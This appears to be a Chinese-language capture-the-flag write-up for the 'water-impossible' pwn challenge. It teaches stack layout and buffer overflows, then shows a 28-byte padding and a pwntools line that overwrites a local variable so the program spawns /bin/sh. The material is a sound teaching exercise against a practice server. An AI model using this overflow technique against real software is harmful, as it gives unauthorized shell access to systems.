# water-impossible

> Challenge Link: [water-impossible](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#water-impossible)
>
> Category: pwn

Welcome !! Challenger ~

Here is a simple challenge for you.

Try to find the key to pass.

`nc bamboofox.cs.nctu.edu.tw 58799`

[water-impossible.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/bb63dedd19b55a8fab5a08f28dea6269/water-impossible.zip)

## 須具備的知識

### Stack

stack 是程式在執行中用來儲存資料的結構，儲存的資料如

- 暫時的值
- return address
- 區域變數
- ...

### rsp

`rsp` 是用來儲存 stack 所在位置的暫存器

### 區域變數

宣告區域變數時，會將值存在 stack 上

假設宣告兩個變數 a, b

```c
int a = 1;
int b = 2;
```

宣告 a 時，stack 狀態如下

```
+----------+    0x7fffffffe728		low
|  a = 1   |
+----------+ 	0x7fffffffe730
|   ...    |
+----------+    0x7fffffffe738		high
```

宣告 b 時，stack 狀態如下

```
+----------+    0x7fffffffe720 	low
|  b = 2   |
+----------+	0x7fffffffe728
|  a = 1   |
+----------+	0x7fffffffe730
|   ...    |
+----------+    0x7fffffffe738	high
```

當 push 值進 stack 時，`rsp` 的位置會減足夠的大小，讓新的值可以填進來，所以後進來的 b 反而會存在較低位的地方

### Buffer overflow

在讀取輸入的時候，輸入的大小超過變數的大小，此時多的部份會超越區域變數的位址，進而蓋到 stack 上的其他位置

假設有一程式如下

```c
int key = 0xdeadbeef;
char buf[16] = {0};
gets(buf);
```

宣告後 stack 狀態如下

```
+----------------+    	0x7fffffffe720 	low  <-----+
|  		0x0	 	 |								   |
+----------------+		0x7fffffffe728 			   |  buf[16]
|  		0x0	 	 | 								   |
+----------------+		0x7fffffffe730 		 <-----+-----+
|   0xdeadbeef   |                                       | key
+----------------+    	0x7fffffffe738	high <-----------+
```

因為 gets 沒有限制輸入的長度，因此可以輸入超過 buf 長度，此時多的部份就會蓋到 stack 其他部份

例如輸入 `aaaaaaaabbbbbbbbcccccccc`

```
+----------------+    	0x7fffffffe720 	low	 <-----+
|  	aaaaaaaa	 | 								   |
+----------------+		0x7fffffffe728             |  buf[16]
|  	bbbbbbbb 	 |                                 |
+----------------+		0x7fffffffe730       <-----+-----+
|  	cccccccc   	 | 										 | key
+----------------+    	0x7fffffffe738	high <-----------+
```

原本 `key` 存的位置就被 buf 的輸入蓋掉了

## 觀察

觀察一下code後可以發現觸發`system("/bin/sh")`的條件為`(int)token == 6666`

而token是一個宣告在`main`但從未被使用到的變數

```c
if((int)token == 6666){
  printf("wow, That's impossible to touch this token ?!");
  system("/bin/sh");
}
```

另外可以被exploit的部份為`read()`的 buffer overflow

```c
char key[16];
read(0, key, 40);
```

通常這類題目可能的作法有以下兩種

### 蓋 return

如果stack一直往下蓋的話可以碰到`return`，那就直接跳到`system("/bin/sh")`就好了

不過這題有限制長度40，所以沒辦法蓋到return

### 蓋 token

因為`token`也是宣告在stack上，應該可以找到`token`的位置後直接蓋成想要的值

## 解法

以下解法是用蓋token的方法

### 找 paylod 長度

先輸入以下字串來定位

```
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
```

到`if((int)token == 6666)`時 stack 狀態如下

![](https://i.imgur.com/0wDePvP.png)

上圖可以看到`token`的位置以及內容是`[rbp-0x4] : 0x7fffffffdf1c ("DDDDEEEEEEEE0آ\367\377\177")`

由此可知到`token`之前，所需要的 payload 長度是 **28** ，也就是

```
AAAAAAAABBBBBBBBCCCCCCCCDDDD
```

### 蓋token的值

因為這支程式是在 **64位元** 的環境編譯的，所以送的時候要給64位元的位址，使用 pwntool 的話只要用`p64()`就可以囉

```python
r.sendline(payload + p64(0x1a0a))
```
